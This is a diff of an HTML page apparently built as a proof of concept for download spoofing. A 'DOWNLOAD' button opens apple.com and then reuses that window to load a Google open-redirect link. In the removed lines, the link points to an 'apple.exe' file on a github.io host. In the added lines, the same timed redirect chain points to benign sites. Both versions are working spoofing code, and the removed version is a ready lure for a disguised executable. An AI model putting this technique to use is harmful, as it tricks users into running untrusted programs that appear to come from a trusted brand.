@@ -1,34 +1,49 @@
-<html>
- <head> 
-  <meta charset="utf-8">
-  <style>
-    .button {
-      border: none;
-      color: white;
-      padding: 15px 32px;
-      text-align: center;
-      text-decoration: none;
-      display: inline-block;
-      font-size: 16px;
-      margin: 4px 2px;
-      cursor: pointer;
-    }
-  </style>
- </head> 
- <body> 
-  <script>
-    function a(){
-        window.open('https://apple.com/', 'x');
-        setTimeout(function(){
-            window.open('https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe&sa=D&sntz=1&usg=AOvVaw1T8ZmQt3x7S7E2wgJuyMLe', 'x');
-        }, 5000);
-    }
-  </script> 
-  <center>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="utf-8">
+    <title>Redirect Bertahap PoC</title>
+    <style>
+        .button {
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #4CAF50;
+        }
+    </style>
+</head>
+<body>
+
+<script>
+function a() {
+    const start = Date.now();
+    console.log("Window opened at", start);
+
+    // Step 1: buka apple.com
+    let win = window.open('https://apple.com', 'x');
+
+    // Step 2: redirect sangat cepat (±100 ms)
+    setTimeout(function () {
+        console.log("Redirect 1 after", Date.now() - start, "ms");
+        win.location.href =
+            'https://www.google.com/url?q=https%3A%2F%2Fexample.com';
+
+        // Step 3: redirect berikutnya (opsional, 900 ms)
+        setTimeout(function () {
+            console.log("Redirect 2 after", Date.now() - start, "ms");
+            win.location.href = 'https://google.com';
+        }, 3000);
+
+    }, 100);
+}
+</script>
+
+<center>
     <input type="button" class="button" value="DOWNLOAD" onclick="a()">
-  </center>
- </body>
+</center>
+
+</body>
 </html>
-
-
-
